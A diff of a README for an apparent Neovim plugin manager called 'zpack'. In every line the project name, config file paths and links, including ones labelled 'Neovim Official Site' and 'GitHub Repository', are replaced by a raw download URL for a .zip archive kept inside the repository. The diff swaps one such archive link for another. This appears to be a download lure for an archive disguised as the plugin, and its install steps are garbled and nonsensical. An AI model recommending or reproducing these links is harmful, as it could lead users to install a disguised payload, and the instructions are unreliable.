@@ -1,14 +1,14 @@
-# 🎉 https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip - Enhance Your Neovim Experience Simply
+# 🎉 https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip - Enhance Your Neovim Experience Simply
 
 ## 🚀 Getting Started
 
-Welcome to **https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip**! This application provides a thin layer over Neovim's native `https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip`. It adds support for lazy-loading and simplifies managing your Neovim plugins. You can enjoy a smooth and efficient workflow with easier plugin management.
+Welcome to **https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip**! This application provides a thin layer over Neovim's native `https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip`. It adds support for lazy-loading and simplifies managing your Neovim plugins. You can enjoy a smooth and efficient workflow with easier plugin management.
 
 ## 📥 Download & Install
 
-To get started with https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip, visit the page below to download the latest version:
+To get started with https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip, visit the page below to download the latest version:
 
-[![Download https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip](https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip)](https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip)
+[![Download https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip](https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip)](https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip)
 
 1. Click the link above to go to the **Releases** page.
 2. Look for the latest version available.
@@ -17,7 +17,7 @@ To get started with https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/l
 
 ## 📂 Installation Instructions
 
-Once you have downloaded the file, follow these steps to install https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip
+Once you have downloaded the file, follow these steps to install https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip
 
 1. **Locate the Downloaded File**: 
    Find the file you just downloaded. This is usually in your "Downloads" folder.
@@ -27,21 +27,21 @@ Once you have downloaded the file, follow these steps to install https://raw.git
 
 3. **Move to the Right Directory**:
    a. Open your terminal or command prompt.
-   b. Navigate to your Neovim configuration directory. On most systems, this is `~https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip`.
+   b. Navigate to your Neovim configuration directory. On most systems, this is `~https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip`.
    c. Inside this directory, find or create a `plugin` folder if it does not exist.
 
-4. **Copy https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip Files**:
-   Move the extracted https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip files into the `plugin` folder. You may do this by dragging and dropping or using terminal commands (like `mv` on Linux/Mac or `move` on Windows).
+4. **Copy https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip Files**:
+   Move the extracted https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip files into the `plugin` folder. You may do this by dragging and dropping or using terminal commands (like `mv` on Linux/Mac or `move` on Windows).
 
 5. **Edit Your Neovim Configuration**:
-   Open `https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip` or `https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip` file in your Neovim configuration directory. Here you will add the necessary lines to load https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip
+   Open `https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip` or `https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip` file in your Neovim configuration directory. Here you will add the necessary lines to load https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip
 
-   For `https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip`:
+   For `https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip`:
    ```vim
-   packadd https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip
+   packadd https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip
    ```
 
-   For `https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip`:
+   For `https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip`:
    ```lua
    require('zpack')
    ```
@@ -50,7 +50,7 @@ Once you have downloaded the file, follow these steps to install https://raw.git
    Open Neovim by typing `nvim` in your terminal. You should see no error messages if everything is set up correctly.
 
 7. **Install Plugins**: 
-   With https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip ready, you can now manage your plugins more easily. Follow the plugin documentation to start adding your favorite tools.
+   With https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip ready, you can now manage your plugins more easily. Follow the plugin documentation to start adding your favorite tools.
 
 ## 🧩 Features
 
@@ -60,7 +60,7 @@ Once you have downloaded the file, follow these steps to install https://raw.git
 
 ## 💻 System Requirements
 
-To run https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip effectively, ensure you have the following installed:
+To run https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip effectively, ensure you have the following installed:
 
 - **Neovim**: Version 0.5 or higher.
 - **Operating System**: 
@@ -82,8 +82,8 @@ For more details on features and advanced usage, you can visit the **Documentati
 
 ## 🔗 Links
 
-- [Download https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip](https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip)
-- [Neovim Official Site](https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/anuvrity/zpack.nvim/main/lua/zpack/zpack-nvim-3.3-alpha.5.zip)
+- [Download https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip](https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip)
+- [Neovim Official Site](https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip)
+- [GitHub Repository](https://github.com/anuvrity/zpack.nvim/raw/refs/heads/main/lua/zpack/lazy_trigger/nvim-zpack-v2.9.zip)
 
 Get started now and simplify your Neovim plugin management today!
